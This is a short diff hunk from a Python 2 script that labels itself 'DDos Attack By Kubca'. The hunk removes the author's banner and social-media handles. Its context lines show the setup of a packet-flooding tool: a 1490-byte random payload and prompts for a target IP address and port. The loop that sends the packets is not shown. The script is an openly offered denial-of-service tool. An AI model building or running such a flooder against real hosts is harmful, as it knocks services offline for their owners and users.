@@ -19,12 +19,6 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack By Kubca")
-print
-print "Author   : Kubca"
-print "You Tube : ckgangontop"
-print "github   : https://github.com/KubcaHvH"
-print "Facebook : Nemamhovna"
-print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
